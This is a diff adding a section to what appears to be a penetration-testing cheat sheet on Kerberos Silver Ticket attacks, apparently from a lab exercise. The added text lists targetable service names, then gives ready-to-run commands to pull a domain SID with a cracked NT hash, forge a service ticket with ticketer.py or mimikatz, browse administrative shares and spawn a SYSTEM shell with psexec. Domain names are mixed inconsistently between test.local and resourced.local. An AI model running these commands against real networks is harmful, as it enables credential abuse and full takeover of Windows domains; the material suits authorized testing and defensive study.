@@ -93,4 +93,82 @@ export KRB5CCNAME=$(pwd)/ticket.ccache
 impacket-psexec resourced/Administrator@srv22.resourced.local -k -no-pass
 ```
 
+# Services You Can Target
 
+| Service | Authorized Access Gained | Verification Example Command |
+|---------|---------------------------|------------------------------|
+| **cifs** | SMB access (file shares, administrative utilities) | `dir \\target\C$` |
+| **http** | Web interface interaction (IIS, WinRM-over-HTTP) | PowerShell Remoting |
+| **wsman** | WinRM access (PowerShell Management) | `Enter-PSSession -ComputerName targethost` |
+| **RDP** | Remote Desktop Protocol connection capability | `mstsc /v:target` |
+| **krbtgt** | **Note:** Used for Golden Tickets, **not** Silver Tickets | Domain Admin privileges |
+| **ldap** | Active Directory database queries | `dsquery *` |
+| **mssqlsvc** | Microsoft SQL Server instance access | `sqlcmd -S target` |
+| **exchange** | Exchange Mail Server control | Automated client mailbox sync |
+| **time** | Host system clock synchronization | NTP infrastructure queries |
+
+# Practical Example Scenario
+
+**Context:** You have recovered the **svc_mssql** account hash from a Kerberoasting attack and need to target the server **SRV22**.
+
+---
+
+## Step 1: Recover the Domain SID
+
+### Option A: From an Established Windows Session
+
+```cmd
+whoami /user
+```
+
+### Option B: From an External Linux Platform (Impacket)
+
+```bash
+impacket-lookupsid test/testuser@192.168.216.175 \
+-hashes :19a3a7550ce8c505c2d46b5e39d6f808
+```
+
+**Resulting Domain SID:**
+
+```text
+S-1-5-21-3623811015-3361044348-30300820
+```
+
+---
+
+## Step 2: Create the Silver Ticket for SRV22
+
+### Option A: Linux (Impacket `ticketer.py`)
+
+```bash
+ticketer.py \
+-domain test.local \
+-domain-sid S-1-5-21-3623811015-3361044348-30300820 \
+-nthash 19a3a7550ce8c505c2d46b5e39d6f808 \
+-spn cifs/test.local \
+Administrator
+
+export KRB5CCNAME=$(pwd)/Administrator.ccache
+```
+
+### Option B: Windows (Mimikatz)
+
+```powershell
+mimikatz.exe "kerberos::golden /domain:resourced.local /sid:S-1-5-21-3623811015-3361044348-30300820 /target:test.local /service:cifs /rc4:19a3a7550ce8c505c2d46b5e39d6f808 /user:Administrator /ptt" exit
+```
+
+---
+
+## Step 3: Access the Target Host
+
+### Enumerate Administrative File Shares
+
+```cmd
+dir \\test.local\C$
+```
+
+### Spawn an Administrative SYSTEM Shell
+
+```cmd
+psexec \\test.local -s cmd.exe
+```
